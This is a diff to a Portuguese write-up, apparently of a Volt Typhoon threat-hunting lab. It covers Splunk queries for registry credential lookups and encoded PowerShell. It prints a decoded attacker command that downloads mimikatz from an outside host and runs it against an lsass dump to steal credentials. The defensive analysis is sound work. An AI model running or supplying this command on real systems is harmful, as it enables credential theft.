@@ -215,25 +215,43 @@ Eu poderia ter documentado apenas o comando correto, mas eu quis mostrar que é 
 
 A tarefa 6 diz que o Volt Typhoon frequentemente vasculha rede de destino para descobrir e extrair credenciais de vários programas, e além disso, eles são conhecidos por acessar credenciais com hash diretamente da memória do sistema.
 A primeira pergunta diz que o grupo usa consultas `reg` para encontrar credenciais úteis, e quer saber quais são os três softwares que eles estão investigando.
-O comando `reg query` serve para consultar e ler informações diretamente do Registro do Windows através do Prompt de Comando (CMD) ou do PowerShell, sem a necessidade de abrir a interface gráfica do Editor do Registro (regedit).
+O comando `reg query` serve para consultar e ler informações diretamente do Registro do Windows através do Prompt de Comando (CMD) ou do PowerShell, sem a necessidade de abrir a interface gráfica do Editor do Registro (regedit). 
+
+Consulta: `index="main" sourcetype="powershell" CommandLine="reg" UserId="*dean-admin*"` 
+
+Explicação da consulta: Estou procurando nos logs do PowerShell alguma linha de comando que contenha a palavra "reg" e que venha do usuário `dean-admin`.
 
 ![Acesso Credencial](img/6-1.jpeg)
+
+A resposta da consulta nos mostra alguns eventos `reg query` que possuem os nomes dos softwares que queremos, o primeiro sendo o `putty`
+
+O segundo `realvnc`
+
 ![Acesso Credencial](img/6-2.jpeg)
+
+E o terceiro `OpenSSH`.
+
 ![Acesso Credencial](img/6-3.jpeg)
 
+A segunda pergunta quer saber o comando decodificado completo que o invasor usa para baixar e executar o programa mimikatz, usado para dumpar de credenciais da memória ram.
+Para executar um comando codificado no terminal, certamente foi usado algum parâmetro como "-enc", "-E", "-encoded" ou algo do tipo. Então, para chegar até a resposta, vou fazer uma consulta com os parâmetros conhecidos que ele pode ter usado para encodar.
 
+Consulta: `index="main" sourcetype="powershell" (UserId="*dean-admin*" OR UserId="*voltyp-admin*") ("-EncodedCommand" OR "-enc" OR "-encoded" OR "-e" OR "-E")`
+
+Explicação da consulta: Estou procurando nos logs do PowerShell algum evento que venha do usuário `dean-admin` e que contenha alguma palavra como "-EncodedCommand", "-enc", "-encoded", "-e" ou "-E".
 
 ![Acesso Credencial](img/6-b.jpeg)
 
-
+A resposta da consulta nos mostra um evento que contém a palavra "-E" e em seguida um comando codificado em Base64. Para descobrir o comando real, precisamos decodificar o Base64 em uma ferramenta de terminal ou online. Primeiro eu copio o código em Base64
 
 ![Acesso Credencial](img/6-ba.jpeg)
 
-
+E colo em um site online usado para codificar e decodificar Base64
 
 ![Acesso Credencial](img/6-bb.jpeg)
 
-
+A saída nos mostra o comando real usado pelo atacante para baixar e executar o mimikatz. 
+`Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`
 
 ### 7. Discovery & Lateral Movement
 
